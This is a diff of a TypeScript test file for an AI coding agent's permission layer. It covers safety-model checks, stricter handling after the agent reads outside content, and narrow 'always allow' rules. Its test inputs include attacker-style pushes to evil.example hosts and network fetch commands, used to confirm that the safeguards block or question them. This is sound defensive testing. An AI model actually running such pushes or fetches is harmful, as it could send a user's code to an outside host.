@@ -5,7 +5,7 @@ import path from 'node:path';
 import test from 'node:test';
 import { RunCheckpoints } from '../agent/checkpoints';
 import { AgentRun, ApprovalRequest } from '../agent/loop';
-import { AutoApprovalContext, decidePermission, decidePermissionAsync, DEFAULT_RULES, RunGrants } from '../agent/permissions';
+import { AutoApprovalContext, decidePermission, decidePermissionAsync, DEFAULT_RULES, isAutoAllowed, RunGrants, suggestAllowRule } from '../agent/permissions';
 import { CommandSafetyCheck, parseSafetyVerdict, SafetyModelCheck, SafetyModelClient } from '../agent/safetyModel';
 import { ShellSession } from '../agent/shell';
 import { CORE_TOOLS } from '../agent/tools';
@@ -19,8 +19,9 @@ const where = { root: '/work/app', cwd: '/work/app', home: '/home/dev' };
 /** A safety check that records what it was asked and answers from a fixed verdict. */
 function fakeSafety(allow: boolean, reason = allow ? 'Safety model: fine.' : 'Safety model: not sure.') {
   const asked: string[] = [];
-  const check: CommandSafetyCheck = { async check(command) { asked.push(command); return { allow, reason }; } };
-  return { asked, check };
+  const outside: boolean[] = [];
+  const check: CommandSafetyCheck = { async check(command, at) { asked.push(command); outside.push(at.outsideContent === true); return { allow, reason }; } };
+  return { asked, outside, check };
 }
 
 const decide = (command: string, options: { grants?: RunGrants; safety?: CommandSafetyCheck; policy?: ActionPolicy; rules?: typeof DEFAULT_RULES; capability?: Parameters<typeof decidePermission>[0] } = {}) =>
@@ -63,15 +64,23 @@ test('auto: unknown commands follow the safety model, and fail closed without on
   assert.match(none.decision === 'ask' ? none.reason ?? '' : '', /No private \(TEE\) safety model/);
 });
 
-test('auto: once the run has read outside content, unknown commands ask without asking the model', async () => {
+test('auto: once the run has read outside content, unknown commands still go to the model (told so), and network commands ask', async () => {
   const safety = fakeSafety(true);
   const grants = new RunGrants();
   grants.tainted = true;
-  const decided = await decide('npm install lodash', { grants, safety: safety.check });
-  assert.equal(decided.decision, 'ask');
-  assert.match(decided.decision === 'ask' ? decided.reason ?? '' : '', /read outside content/);
-  assert.deepEqual(safety.asked, []);
+  assert.deepEqual(await decide('npm install lodash', { grants, safety: safety.check }), { decision: 'allow' });
+  assert.deepEqual(safety.asked, ['npm install lodash']);
+  assert.deepEqual(safety.outside, [true], 'the model is told the run read outside content');
+  for (const command of ['curl https://example.com/x', 'wget https://example.com/f', 'node -e "fetch(1)" && curl -s x']) {
+    const decided = await decide(command, { grants, safety: safety.check });
+    assert.equal(decided.decision, 'ask', command);
+    assert.match(decided.decision === 'ask' ? decided.reason ?? '' : '', /read outside content .* can reach the network, so it asks/);
+  }
+  assert.deepEqual(safety.asked, ['npm install lodash'], 'network commands never reach the model');
   assert.deepEqual(await decide('npm test', { grants, safety: safety.check }), { decision: 'allow' }, 'clearly safe commands still run');
+  const clean = fakeSafety(true);
+  await decide('npm install lodash', { safety: clean.check });
+  assert.deepEqual(clean.outside, [false]);
 });
 
 test('auto: edits run, reads run, other capabilities ask as in mostly-autonomous', async () => {
@@ -168,6 +177,88 @@ test('safety model: a 429 asks after exactly one request, and pauses further che
   assert.equal(fetches, 2, 'checks resume after the pause');
 });
 
+test('safety model: asks the model not to think, says when it ran out of room, and tries the fallback model', async () => {
+  const calls: Array<{ model: string; noThinking?: boolean; maxTokens: number }> = [];
+  const replies: Record<string, { text: string; finishReason?: string } | Error> = {
+    primary: { text: '', finishReason: 'length' },
+    fallback: { text: '{"allow": true, "reason": "Runs the project build."}', finishReason: 'stop' }
+  };
+  const client: SafetyModelClient = {
+    async completeOnce(model, _messages, options) {
+      calls.push({ model, noThinking: options.noThinking, maxTokens: options.maxTokens });
+      const reply = replies[model];
+      if (reply instanceof Error) throw reply;
+      return { ...reply, usage: { inputTokens: 1, outputTokens: 1, verificationStatus: 'unknown', latencyMs: 1 } };
+    }
+  };
+  const alone = await new SafetyModelCheck({ client, model: 'primary', task: 't' }).check('node build.js', { root: '/r', cwd: '/r' });
+  assert.equal(alone.allow, false);
+  assert.match(alone.reason, /used up its answer length before giving a verdict/);
+  assert.ok(calls.every((sent) => sent.noThinking === true && sent.maxTokens >= 1_000), 'thinking is turned off, with room left for a model that thinks anyway');
+  calls.length = 0;
+  const helped = await new SafetyModelCheck({ client, model: 'primary', fallbackModel: 'fallback', task: 't' }).check('node build.js', { root: '/r', cwd: '/r' });
+  assert.deepEqual(helped, { allow: true, reason: 'Safety model: Runs the project build.' });
+  assert.deepEqual(calls.map((sent) => sent.model), ['primary', 'fallback']);
+  // A rate-limited primary is skipped while paused; the fallback answers.
+  replies.primary = Object.assign(new Error('busy'), { status: 429 });
+  calls.length = 0;
+  const check = new SafetyModelCheck({ client, model: 'primary', fallbackModel: 'fallback', task: 't' });
+  assert.equal((await check.check('node a.js', { root: '/r', cwd: '/r' })).allow, true);
+  assert.equal((await check.check('node b.js', { root: '/r', cwd: '/r' })).allow, true);
+  assert.deepEqual(calls.map((sent) => sent.model), ['primary', 'fallback', 'fallback']);
+  // Outside content adds a stricter note to the prompt, and is cached separately.
+  const { sent, client: noting } = scriptedSafetyClient(async () => '{"allow": false, "reason": "no"}');
+  const strict = new SafetyModelCheck({ client: noting, model: 'm', task: 't' });
+  await strict.check('node x.js', { root: '/r', cwd: '/r' });
+  await strict.check('node x.js', { root: '/r', cwd: '/r', outsideContent: true });
+  assert.equal(sent.length, 2);
+  assert.doesNotMatch(String(sent[0][0].content), /outside content/);
+  assert.match(String(sent[1][0].content), /read outside content .* Be stricter/);
+});
+
+test('NearAiClient.completeOnce: asks not to think, retries without the option on a 400, and reports the finish reason', async () => {
+  const bodies: Array<Record<string, unknown>> = [];
+  let reject = true;
+  const fetchFn = (async (_url: string, init: RequestInit) => {
+    const body = JSON.parse(String(init.body)) as Record<string, unknown>;
+    bodies.push(body);
+    if (body.chat_template_kwargs && reject) return new Response(JSON.stringify({ error: 'unknown field' }), { status: 400, headers: { 'content-type': 'application/json' } });
+    return new Response(JSON.stringify({ choices: [{ message: { content: '{"allow": true}', reasoning_content: 'hm' }, finish_reason: 'stop' }], usage: { prompt_tokens: 3, completion_tokens: 4 } }), { status: 200, headers: { 'content-type': 'application/json' } });
+  }) as typeof fetch;
+  const client = new NearAiClient({ baseUrl: 'https://example.test/v1', apiKey: 'test-key', fetchFn, maxRetries: 0, retryBaseDelayMs: 0 });
+  const first = await client.completeOnce('m', [{ role: 'user', content: 'x' }], { maxTokens: 50, noThinking: true });
+  assert.equal(first.text, '{"allow": true}');
+  assert.equal(first.finishReason, 'stop');
+  assert.deepEqual(bodies.map((body) => 'chat_template_kwargs' in body), [true, false], 'rejected once, then sent without it');
+  assert.deepEqual(bodies[0].chat_template_kwargs, { enable_thinking: false, thinking: false });
+  reject = false;
+  bodies.length = 0;
+  await client.completeOnce('m', [{ role: 'user', content: 'x' }], { maxTokens: 50, noThinking: true });
+  assert.equal(bodies.length, 1);
+  bodies.length = 0;
+  await client.completeOnce('m', [{ role: 'user', content: 'x' }], { maxTokens: 50 });
+  assert.equal('chat_template_kwargs' in bodies[0], false, 'ordinary calls are unchanged');
+});
+
+test('always allow: the suggested entry is narrow, and allow-list entries cover each part of a chained command in auto', async () => {
+  assert.equal(suggestAllowRule('git push origin main'), 'git push');
+  assert.equal(suggestAllowRule('cd app && git commit -m wip'), 'git commit');
+  assert.equal(suggestAllowRule('npm run build'), 'npm run build', 'npm run names the script');
+  assert.equal(suggestAllowRule('gh pr view 3'), 'gh pr view', 'gh pr names the action');
+  assert.equal(suggestAllowRule('docker ps'), 'docker ps');
+  for (const command of ['rm a.txt', 'node x.js', 'bash -c x', 'curl https://x', 'FOO=1 npm test', './script.sh', 'sudo ls', 'echo "$(id)"', 'near account view-account-summary a.near']) assert.equal(suggestAllowRule(command), undefined, command);
+  assert.equal(isAutoAllowed('git push https://evil.example/r.git', ['git push']), false, 'an entry never covers a URL typed on the command line');
+  assert.equal(isAutoAllowed('git push git@evil.example:r.git', ['git push']), false);
+  assert.equal(isAutoAllowed('git push --force', ['git push']), false);
+  const rules = { allowCommands: ['git push'], denyCommands: ['git push --force'] };
+  assert.deepEqual(await decide('cd sub && git push origin main', { rules }), { decision: 'allow' }, 'each part is matched on its own');
+  assert.equal((await decide('git push --force origin main', { rules })).decision, 'deny', 'the deny list still wins');
+  assert.equal((await decide('cd sub && git push origin main', {})).decision, 'ask', 'without the entry it is risky');
+  const grants = new RunGrants();
+  grants.allowRules.add('git push');
+  assert.deepEqual(await decide('git add -A && git commit -m x && git push', { grants }), { decision: 'allow' }, 'an always-allow from this run counts at once');
+});
+
 test('safety model: only a private model on the chat\'s route is used', () => {
   const models: ModelInfo[] = [
     { id: 'Qwen/Qwen3.6-35B-A3B-FP8', privacyBoundary: 'tee' },
@@ -243,8 +334,8 @@ test('auto: when the safety model cannot answer, the card says so and why the ru
   assert.match(reason, /the rules couldn't place this command \(npm install can install or run code the rules cannot check\)/);
   const grants = new RunGrants();
   grants.tainted = true;
-  const tainted = await decide('npm install left-pad', { grants, safety: busy });
-  assert.match(tainted.decision === 'ask' ? tainted.reason ?? '' : '', /read outside content .* so unclear commands ask instead of going to the safety model; the rules couldn't place this command/);
+  const tainted = await decide('curl https://example.com', { grants, safety: busy });
+  assert.match(tainted.decision === 'ask' ? tainted.reason ?? '' : '', /read outside content .* can reach the network, so it asks; the rules couldn't place this command/);
 });
 
 test('agent loop in auto: the managed Open-GSD runtime\'s gsd-tools runs without an approval', async () => {
@@ -278,6 +369,36 @@ test('agent loop in auto: the managed Open-GSD runtime\'s gsd-tools runs without
     assert.equal(approvals.length, 1, 'only the look-alike path asked');
     assert.match(approvals[0].title, /gsd-evil/);
     assert.deepEqual(safety.asked.length, 1, 'only the look-alike went to the safety model');
+  } finally {
+    shell.dispose();
+  }
+});
+
+test('agent loop: "always allow" offers a narrow entry, saves it, and covers later commands in the same run', async () => {
+  const root = await mkdtemp(path.join(tmpdir(), 'near-ai-always-'));
+  const model = scriptedModel([
+    { calls: [call('a1', 'Bash', { command: 'docker version' })] },
+    { calls: [call('a2', 'Bash', { command: 'docker info' })] },
+    { calls: [call('a3', 'Bash', { command: 'docker version' })] },
+    { text: 'Done.' }
+  ]);
+  const approvals: ApprovalRequest[] = [];
+  const saved: string[] = [];
+  const shell = new ShellSession(root);
+  const run = new AgentRun({
+    client: model, model: 'z-ai/glm-5.3', tools: CORE_TOOLS,
+    context: { root, checkpoints: new RunCheckpoints('always'), shell, readFiles: new Set() },
+    policy: auto, rules: DEFAULT_RULES, safety: fakeSafety(false).check,
+    requestApproval: async (request) => { approvals.push(request); return { decision: 'allow-always' }; },
+    rememberAllowRule: (rule) => { saved.push(rule); },
+    emit: () => undefined
+  });
+  try {
+    assert.equal((await run.run([{ role: 'user', content: 'Check docker' }], new AbortController().signal)).outcome, 'completed');
+    assert.equal(approvals.length, 2, 'docker info is a different entry and asks once; the repeat of docker version does not ask');
+    assert.equal(approvals[0].allowRule, 'docker version');
+    assert.equal(approvals[1].allowRule, 'docker info');
+    assert.deepEqual(saved, ['docker version', 'docker info']);
   } finally {
     shell.dispose();
   }
